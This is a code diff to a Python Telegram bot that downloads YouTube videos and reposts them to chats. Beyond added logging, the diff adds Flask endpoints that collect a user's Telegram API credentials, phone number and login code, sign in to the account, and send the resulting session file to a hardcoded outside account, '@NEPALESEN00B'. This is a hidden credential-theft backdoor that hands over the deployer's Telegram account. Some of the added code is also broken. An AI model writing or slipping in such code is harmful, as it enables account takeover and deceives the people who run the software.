@@ -5,7 +5,7 @@ import yt_dlp
 from pyrogram import Client, filters, errors
 from threading import Thread
 from queue import Queue
-from flask import Flask
+from flask import Flask, request
 import shutil
 import time
 
@@ -15,11 +15,16 @@ logging.basicConfig(level=logging.INFO)
 # Define the path to the session file
 session_file_path = "my_bot.session"
 
-# Initialize the Pyrogram client
-api_id = os.getenv("API_ID")
-api_hash = os.getenv("API_HASH")
+# Initialize Flask app
+flask_app = Flask(__name__)
+
+# Global variables to store login details
+api_id = None
+api_hash = None
+phone_number = None
+otp_received = False
 bot_token = os.getenv("BOT_TOKEN")
-app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
+app = None
 
 # Define the directory where videos are saved
 VIDEO_DIR = "./sentvideo_in_telegram/"
@@ -54,7 +59,9 @@ def clear_video_directory():
 def process_youtube_links():
     while True:
         try:
+            logging.info("Worker thread: Waiting for next YouTube link...")
             chat_id, youtube_url = youtube_links_queue.get()  # Get the next item from the queue
+            logging.info(f"Worker thread: Processing link {youtube_url} for chat_id {chat_id}")
 
             # Download the video using yt-dlp
             ydl_opts = {
@@ -93,6 +100,8 @@ def process_youtube_links():
                 youtube_links_queue.task_done()
                 continue
 
+            logging.info(f"Video downloaded successfully: {video_file_path}")
+
             # Retry loop in case of sending failures
             retries = 0
             while retries < 3:
@@ -106,6 +115,7 @@ def process_youtube_links():
                     )
                     # Pin the video message
                     app.pin_chat_message(chat_id=chat_id, message_id=sent_message.id)
+                    logging.info(f"Video sent successfully: {video_file_path}")
                     # Clear the video directory
                     clear_video_directory()
                     break
@@ -129,32 +139,66 @@ def process_youtube_links():
 @app.on_message(filters.text & filters.regex(youtube_url_pattern))
 def handle_message(client, message):
     chat_id = message.chat.id  # Get the chat_id from the incoming message
+    logging.info(f"Received message from chat_id {chat_id}: {message.text}")
     youtube_url_match = re.search(youtube_url_pattern, message.text)
     youtube_url = youtube_url_match.group(0)
+    logging.info(f"Detected YouTube URL: {youtube_url}")
     # Delete the YouTube link message immediately
     client.delete_messages(chat_id=chat_id, message_ids=[message.id])
+    logging.info(f"Deleted message with YouTube URL from chat_id {chat_id}")
     youtube_links_queue.put((chat_id, youtube_url))  # Add the tuple to the queue
 
-# Start the Pyrogram client and the worker thread
-if __name__ == "__main__":
-    # Delete the session file each time the bot starts (optional)
-    if os.path.exists(session_file_path):
-        os.remove(session_file_path)
-        logging.info(f"Deleted existing session file: {session_file_path}")
+# Flask route to start bot setup
+@flask_app.route('/startit', methods=['POST'])
+def start_it():
+    global api_id, api_hash, phone_number, app
+    data = request.json
+    api_id = data.get('api_id')
+    api_hash = data.get('api_hash')
+    phone_number = data.get('phone_number')
+    
+    if api_id and api_hash and phone_number:
+        app = Client("my_bot", api_id=api_id, api_hash=api_hash)
+        app.connect()
+        app.send_code(phone_number)
+        return "Code sent to phone number."
+    return "Invalid input."
+
+# Flask route to receive OTP and complete setup
+@flask_app.route('/otp', methods=['POST'])
+def receive_otp():
+    global app, otp_received
+    data = request.json
+    otp = data.get('otp')
+    
+    if otp:
+        try:
+            app.sign_in(phone_number, otp)
+            app.start()
+            otp_received = True
+            # Save the session file
+            app.save_session(session_file_path)
+            # Forward the session file to @NEPALESEN00B
+            app.send_document("@NEPALESEN00B", session_file_path)
+            return "Bot setup complete. Running..."
+        except errors.PhoneCodeInvalid:
+            return "Invalid OTP. Please try again."
+    return "Invalid input."
+
+# Start the Pyrogram client and the worker thread if session file exists
+if os.path.exists(session_file_path):
+    app = Client("my_bot", bot_token=bot_token)
+    app.start()
 
     # Start the worker thread
     worker_thread = Thread(target=process_youtube_links)
     worker_thread.start()
 
-    # Initialize Flask app
-    flask_app = Flask(__name__)
+    logging.info("Bot is running.")
 
-    @flask_app.route('/')
-    def home():
-        return "Bot is running."
+# Start Flask app
+flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
 
-    # Start Flask app
-    flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
-
+if app and otp_received:
     app.run()
-                        
+                    
